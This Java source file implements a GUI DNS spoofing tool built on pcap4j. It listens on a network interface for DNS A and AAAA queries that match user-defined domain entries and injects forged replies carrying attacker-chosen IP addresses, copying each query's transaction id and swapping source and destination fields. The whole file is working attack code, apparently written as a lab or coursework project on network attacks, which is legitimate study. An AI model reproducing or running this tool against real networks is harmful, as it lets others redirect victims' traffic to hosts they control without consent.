package emma.dns;

import emma.*;
import org.pcap4j.core.*;
import org.pcap4j.packet.*;
import org.pcap4j.packet.namednumber.*;

import javax.swing.*;
import java.net.Inet4Address;
import java.net.Inet6Address;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.List;
import java.util.function.Function;

/**
 * Created 14/06/2022 by SuperMartijn642
 */
public class DNSSpoofingAttackHandler implements AttackHandler {

    private JComboBox<ComboBoxEntryWrapper<PcapNetworkInterface>> interfaceDropdown;
    private JList<DNSEntry> entryList;
    private JButton addEntryButton, removeEntryButton;
    private JButton startButton, stopButton;
    private JTextArea outputField;

    private List<PcapNetworkInterface> allNetworkInterfaces;
    private PcapNetworkInterface networkInterface;
    private final List<DNSEntry> entries = new ArrayList<>();

    private boolean isIntercepting = false;

    @Override
    public void initialize(){
        this.allNetworkInterfaces = NetworkUtils.gatherNetworkInterfaces();
    }

    @Override
    public void initializeWindow(JFrame frame){
        // Set the window size
        frame.setSize(915, 590);

        // Interface dropdown
        JLabel interfaceDropdownLabel = new JLabel("Network interface:");
        interfaceDropdownLabel.setBounds(10, 10, 150, 15);
        frame.add(interfaceDropdownLabel);
        this.interfaceDropdown = new JComboBox<>();
        this.interfaceDropdown.setBounds(10, 25, 310, 30);
        this.interfaceDropdown.setEditable(false);
        Function<PcapNetworkInterface,String> formatter = networkInterface -> networkInterface.getDescription() + " (" + networkInterface.getName() + ")";
        this.allNetworkInterfaces.stream().map(networkInterface -> new ComboBoxEntryWrapper<>(networkInterface, formatter)).forEach(this.interfaceDropdown::addItem);
        //noinspection unchecked
        this.interfaceDropdown.addItemListener(event -> this.selectInterface(((ComboBoxEntryWrapper<PcapNetworkInterface>)event.getItem()).getObject()));
        frame.add(this.interfaceDropdown);

        // Entries list
        JLabel entriesLabel = new JLabel("DNS entries:");
        entriesLabel.setBounds(10, 75, 150, 15);
        frame.add(entriesLabel);
        this.entryList = new JList<>();
        this.entryList.setBounds(10, 90, 310, 400);
        this.entryList.setSelectedIndex(-1);
        this.entryList.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        this.entryList.addListSelectionListener(event -> this.removeEntryButton.setEnabled(this.entryList.getSelectedIndex() >= 0));
        frame.add(this.entryList);

        // Add entry button
        this.addEntryButton = new JButton("+");
        this.addEntryButton.setBounds(327, 95, 42, 42);
        this.addEntryButton.setToolTipText("Add entry");
        this.addEntryButton.addActionListener(event -> new DNSEntryWindow(frame, this::addEntry));
        frame.add(this.addEntryButton);

        // Remove entry button
        this.removeEntryButton = new JButton("-");
        this.removeEntryButton.setBounds(327, 142, 42, 42);
        this.removeEntryButton.setToolTipText("Remove selected entry");
        this.removeEntryButton.setEnabled(false);
        this.removeEntryButton.addActionListener(event -> {
            if(this.entryList.getSelectedIndex() >= 0)
                this.removeEntry(this.entryList.getSelectedIndex());
        });
        frame.add(this.removeEntryButton);

        // Start intercepting button
        this.startButton = new JButton("Start");
        this.startButton.setBounds(10, 510, 150, 30);
        this.startButton.setToolTipText("Start spoofing DNS entries");
        this.startButton.addActionListener(action -> this.startIntercepting());
        frame.add(this.startButton);

        // Stop intercepting button
        this.stopButton = new JButton("Stop");
        this.stopButton.setBounds(170, 510, 150, 30);
        this.stopButton.setToolTipText("Stop spoofing DNS entries");
        this.stopButton.addActionListener(action -> this.stopIntercepting());
        this.stopButton.setEnabled(false);
        frame.add(this.stopButton);

        // Output field
        this.outputField = new JTextArea();
        this.outputField.setEditable(false);
        this.outputField.setLineWrap(true);
        JScrollPane outputScrollPane = new JScrollPane(this.outputField);
        outputScrollPane.setBounds(390, 10, 500, 530);
        outputScrollPane.setBorder(null);
        outputScrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
        frame.add(outputScrollPane);

        this.selectInterface(this.interfaceDropdown.getSelectedIndex() >= 0 ? ((ComboBoxEntryWrapper<PcapNetworkInterface>)this.interfaceDropdown.getSelectedItem()).getObject() : null);
    }

    @Override
    public void shutdown(){
        if(this.isIntercepting)
            this.stopIntercepting();
    }

    private void selectInterface(PcapNetworkInterface networkInterface){
        this.networkInterface = networkInterface;

        // Update the buttons
        boolean valid = this.networkInterface != null;
        this.startButton.setEnabled(valid);
    }

    private synchronized void startIntercepting(){
        if(this.isIntercepting){
            Main.displayError("Program is already interception DNS requests!");
            return;
        }
        this.isIntercepting = true;

        // Disable the interface selection dropdown
        this.interfaceDropdown.setEnabled(false);
        // Update the start and stop buttons
        this.startButton.setEnabled(false);
        this.stopButton.setEnabled(true);

        new Thread(() -> {
            // Open a new connection
            try(PcapHandle handle = NetworkUtils.openConnection(this.networkInterface, 10)){
                handle.setBlockingMode(PcapHandle.BlockingMode.BLOCKING);
                handle.setFilter("udp", BpfProgram.BpfCompileMode.NONOPTIMIZE);

                // Start accepting packets
                while(this.isIntercepting){
                    // Wait for next packet
                    Packet packet = handle.getNextPacket();

                    if(packet == null)
                        continue;

                    // Check if the packet contains DNS protocol
                    if(packet.contains(DnsPacket.class) && packet.contains(UdpPacket.class)){
                        DnsPacket dnsPacket = packet.get(DnsPacket.class);

                        // Check if the DNS packet is a request
                        DnsPacket.DnsHeader header = dnsPacket.getHeader();
                        if(!header.isResponse() && !header.getQuestions().isEmpty()){
                            // Try to generate a response
                            Packet responsePacket = this.generateResponse(packet, header);
                            // Send the response message
                            if(responsePacket != null)
                                handle.sendPacket(responsePacket);
                        }
                    }
                }
            }catch(PcapNativeException | NotOpenException e){
                e.printStackTrace();
                if(this.isIntercepting)
                    this.stopIntercepting();
            }
        }, "DNS Request Interceptor").start();
    }

    private synchronized void stopIntercepting(){
        if(!this.isIntercepting){
            Main.displayError("Program is already not interception DNS requests!");
            return;
        }
        this.isIntercepting = false;

        // Disable the interface selection dropdown
        this.interfaceDropdown.setEnabled(true);
        // Update the start and stop buttons
        this.startButton.setEnabled(true);
        this.stopButton.setEnabled(false);
    }

    private synchronized void addEntry(DNSEntry entry){
        this.entries.add(entry);
        this.entryList.setListData(this.entries.toArray(DNSEntry[]::new));
    }

    private synchronized void removeEntry(int index){
        this.entries.remove(index);
        this.entryList.setListData(this.entries.toArray(DNSEntry[]::new));
    }

    private synchronized InetAddress getMapping(String domain, boolean isIpV4){
        // Find a matching entry
        return this.entries.stream()
            .filter(entry -> entry.isIpV4() == isIpV4 && entry.matches(domain))
            .findFirst()
            .map(DNSEntry::getIp)
            .orElse(null);
    }

    private Packet generateResponse(Packet packet, DnsPacket.DnsHeader header){
        // Get the transaction id
        short transactionId = header.getId();
        // Get the queries
        List<DnsQuestion> queries = header.getQuestions();

        // Generate answers
        List<DnsResourceRecord> answers = new ArrayList<>();
        for(DnsQuestion query : queries){
            // Skip any non 'A' or 'AAAA' requests
            DnsResourceRecordType type = query.getQType();
            if(type != DnsResourceRecordType.A && type != DnsResourceRecordType.AAAA)
                continue;
            boolean isIpV4 = type == DnsResourceRecordType.A;

            // Get the requested domain
            DnsDomainName domain = query.getQName();
            // Find a matching record
            InetAddress mapping = this.getMapping(domain.getName(), isIpV4);
            // Skip if no matching records
            if(mapping == null)
                continue;

            // Show mapping in the output field
            this.logMessage("Responding '" + mapping.getHostAddress() + "' to request for " + (isIpV4 ? "A" : "AAAA") + " '" + domain.getName() + "'");

            // Create a proper dns address
            DnsResourceRecord.DnsRData address = isIpV4 ?
                new DnsRDataA.Builder().address((Inet4Address)mapping).build() :
                new DnsRDataAaaa.Builder().address((Inet6Address)mapping).build();

            // Create an answer
            DnsResourceRecord answer = new DnsResourceRecord.Builder()
                .name(domain)
                .dataType(type)
                .dataClass(query.getQClass())
                .ttl(60)
                .rdLength((short)address.length())
                .rData(address)
                .build();
            answers.add(answer);
        }

        // If none of the requested domains matched, don't send anything
        if(answers.size() == 0)
            return null;

        // Build the response packet
        DnsPacket.Builder dnsBuilder = new DnsPacket.Builder()
            // Transaction id
            .id(transactionId)
            // Flags
            .response(true)
            .opCode(DnsOpCode.QUERY)
            .authoritativeAnswer(false)
            .truncated(false)
            .recursionDesired(true)
            .recursionAvailable(false)
            .reserved(false)
            .authenticData(false)
            .checkingDisabled(false)
            .rCode(DnsRCode.NO_ERROR)
            // Question count
            .qdCount((short)queries.size())
            // Answer count
            .anCount((short)answers.size())
            // Authority RRs
            .nsCount((short)0)
            // Additional RRs
            .arCount((short)0)
            // Queries
            .questions(queries)
            // Answers
            .answers(answers);

        // Get the source and destination ip addresses
        boolean isIPv4 = packet.contains(IpV4Packet.class);
        InetAddress srcAddress = isIPv4 ? packet.get(IpV4Packet.class).getHeader().getSrcAddr() : packet.get(IpV6Packet.class).getHeader().getSrcAddr();
        InetAddress dstAddress = isIPv4 ? packet.get(IpV4Packet.class).getHeader().getDstAddr() : packet.get(IpV6Packet.class).getHeader().getDstAddr();
        // Wrap the DNS packet in a UDP packet
        UdpPacket.UdpHeader udpPacket = packet.get(UdpPacket.class).getHeader();
        UdpPacket.Builder udpBuilder = PacketUtils.wrapInUDPPacket(dstAddress, udpPacket.getDstPort(), srcAddress, udpPacket.getSrcPort(), dnsBuilder);
        // Wrap the UDP packet in an IPv4 or IPv6 packet
        Packet.Builder ipBuilder;
        if(isIPv4){
            // Wrap the UDP packet in an IPv4 packet
            IpV4Packet.IpV4Header ipV4Packet = packet.get(IpV4Packet.class).getHeader();
            ipBuilder = PacketUtils.wrapInIPv4Packet(ipV4Packet.getDstAddr(), ipV4Packet.getSrcAddr(), IpNumber.UDP, udpBuilder);
        }else{
            // Wrap the UDP packet in an IPv6 packet
            IpV6Packet.IpV6Header ipV6Packet = packet.get(IpV6Packet.class).getHeader();
            ipBuilder = PacketUtils.wrapInIPv6Packet(ipV6Packet.getDstAddr(), ipV6Packet.getSrcAddr(), (byte)69, IpNumber.UDP, udpBuilder);
        }
        // Wrap the IPv6 packet in an ethernet packet
        EthernetPacket.EthernetHeader ethernetPacket = packet.get(EthernetPacket.class).getHeader();
        EthernetPacket.Builder ethernetBuilder = PacketUtils.wrapInEthernetPacket(ethernetPacket.getDstAddr(), ethernetPacket.getSrcAddr(), isIPv4 ? EtherType.IPV4 : EtherType.IPV6, ipBuilder);

        // Finally, return the response packet
        return ethernetBuilder.build();
    }

    private void logMessage(String message){
        this.outputField.append(message + "\n");
        System.out.println(message);
    }
}
